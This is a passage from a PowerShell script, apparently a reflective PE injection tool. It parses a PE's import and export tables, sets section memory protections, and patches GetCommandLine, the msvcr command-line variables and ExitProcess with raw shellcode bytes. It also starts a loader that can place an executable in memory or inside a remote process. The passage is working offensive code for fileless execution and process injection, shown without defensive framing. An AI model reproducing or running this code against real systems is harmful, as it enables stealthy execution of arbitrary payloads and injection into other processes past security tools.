                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }

                $ImportDllHandle = [IntPtr]::Zero
                $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
                Write-Verbose "Importing $ImportDllPath"
                
                if ($RemoteLoading -eq $true)
                {
                    $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
                    #Write-Verbose "Imported $ImportDllPath to remote process"
                }
                else
                {
                    $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
                    #Write-Verbose "Imported $ImportDllPath"
                }

                if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
                {
                    throw "Error importing DLL, DLLName: $ImportDllPath"
                }
                
                #Get the first thunk, then loop through all of them
                [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
                [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                
                while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
                {
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
                    #Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
                    #   If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
                    #   and doing the comparison, just see if it is less than 0
                    [IntPtr]$NewThunkRef = [IntPtr]::Zero
                    if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    else
                    {
                        [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
                        $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
                    }
                    
                    if ($RemoteLoading -eq $true)
                    {
                        [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
                        
                    }
                    else
                    {
                        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
                    }
                    if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
                    {
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
                    
                    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }

    Function Get-VirtualProtectValue
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $SectionCharacteristics
        )
        
        $ProtectionFlag = 0x0
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
                }
            }
        }
        
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
        }
        
        return $ProtectionFlag
    }

    Function Update-MemoryProtectionFlags
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
            [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
            
            [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
            [UInt32]$SectionSize = $SectionHeader.VirtualSize
            
            [UInt32]$OldProtectFlag = 0
            Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
            $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Unable to change memory protection"
            }
        }
    }
    
    #This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
    #Returns an object with addresses to copies of the bytes that were overwritten (and the count)
    Function Update-ExeFunctions
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ExeArguments,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $ExeDoneBytePtr
        )
        
        #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
        $ReturnArray = @() 
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$OldProtectFlag = 0
        
        [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
        if ($Kernel32Handle -eq [IntPtr]::Zero)
        {
            throw "Kernel32 handle null"
        }
        
        [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
        if ($KernelBaseHandle -eq [IntPtr]::Zero)
        {
            throw "KernelBase handle null"
        }

        #################################################
        #First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
        #   We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
        $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
        $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
    
        [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
        [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

        if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
        }

        #Prepare the shellcode
        [Byte[]]$Shellcode1 = @()
        if ($PtrSize -eq 8)
        {
            $Shellcode1 += 0x48 #64bit shellcode has the 0x48 before the 0xb8
        }
        $Shellcode1 += 0xb8
        
        [Byte[]]$Shellcode2 = @(0xc3)
        $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
        
        
        #Make copy of GetCommandLineA and GetCommandLineW
        $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
        $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
        $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
        $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

        #Overwrite GetCommandLineA
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $GetCommandLineAAddrTemp = $GetCommandLineAAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        
        
        #Overwrite GetCommandLineW
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $GetCommandLineWAddrTemp = $GetCommandLineWAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        #################################################
        
        
        #################################################
        #For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
        #   I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
        #   It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
        #   argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
        $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
        
        foreach ($Dll in $DllList)
        {
            [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
            if ($DllHandle -ne [IntPtr]::Zero)
            {
                [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
                [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
                if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }
                
                $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
                $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
                
                #Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
                $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
                $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
                $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
                $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
                $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
                
                $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
                
                $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
            }
        }
        #################################################
        
        
        #################################################
        #Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

        $ReturnArray = @()
        $ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
        
        #CorExitProcess (compiled in to visual studio c++)
        [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
        if ($MscoreeHandle -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
        if ($CorExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        $ExitFunctions += $CorExitProcessAddr
        
        #ExitProcess (what non-managed programs use)
        [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
        if ($ExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "ExitProcess address not found"
        }
        $ExitFunctions += $ExitProcessAddr
        
        [UInt32]$OldProtectFlag = 0
        foreach ($ProcExitFunctionAddr in $ExitFunctions)
        {
            $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
            #The following is the shellcode (Shellcode: ExitThread.asm):
            #32bit shellcode
            [Byte[]]$Shellcode1 = @(0xbb)
            [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            #64bit shellcode (Shellcode: ExitThread.asm)
            if ($PtrSize -eq 8)
            {
                [Byte[]]$Shellcode1 = @(0x48, 0xbb)
                [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$Shellcode3 = @(0xff, 0xd3)
            $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length
            
            [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
            if ($ExitThreadAddr -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }

            $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            #Make copy of original ExitProcess bytes
            $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
            $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
            $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
            
            #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
            #   call ExitThread
            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

            $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
        #################################################

        Write-Output $ReturnArray
    }
    
    
    #This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
    #   It copies Count bytes from Source to Destination.
    Function Copy-ArrayOfMemAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $CopyInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [UInt32]$OldProtectFlag = 0
        foreach ($Info in $CopyInfo)
        {
            $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }
            
            $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
            
            $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
    }


    #####################################
    ##########    FUNCTIONS   ###########
    #####################################
    Function Get-MemoryProcAddress
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )
        
        $Win32Types = Get-Win32Types
        $Win32Constants = Get-Win32Constants
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
        
        #Get the export table
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
        
        for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
        {
            #AddressOfNames is an array of pointers to strings of the names of the functions exported
            $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

            if ($Name -ceq $FunctionName)
            {
                #AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
                #    which contains the offset of the function in to the DLL
                $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
                $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
                return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
            }
        }
        
        return [IntPtr]::Zero
    }


    Function Invoke-MemoryLoadLibrary
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $ExeArgs,
        
        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
        )
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types
        
        $RemoteLoading = $false
        if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $RemoteLoading = $true
        }
        
        #Get basic PE information
        Write-Verbose "Getting basic PE information from the file"
        $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
        $OriginalImageBase = $PEInfo.OriginalImageBase
        $NXCompatible = $true
        if (($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            $NXCompatible = $false
        }
        
        
        #Verify that the PE and the current process are the same bits (32bit or 64bit)
        $Process64Bit = $true
        if ($RemoteLoading -eq $true)
        {
            $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
            $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
            if ($Result -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }
            
            [Bool]$Wow64Process = $false
            $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
            if ($Success -eq $false)
            {
                Throw "Call to IsWow64Process failed"
            }
            
            if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $Process64Bit = $false
            }
            
            #PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
            $PowerShell64Bit = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $PowerShell64Bit = $false
            }
            if ($PowerShell64Bit -ne $Process64Bit)
            {
                throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $Process64Bit = $false
            }
        }
        if ($Process64Bit -ne $PEInfo.PE64Bit)
        {
            Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }
        

        #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
        Write-Verbose "Allocating memory for the PE and write its headers to memory"
        
        #ASLR check
        [IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ($PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
        if ((-not $ForceASLR) -and (-not $PESupportsASLR))
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
            [IntPtr]$LoadAddr = $OriginalImageBase
        }
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

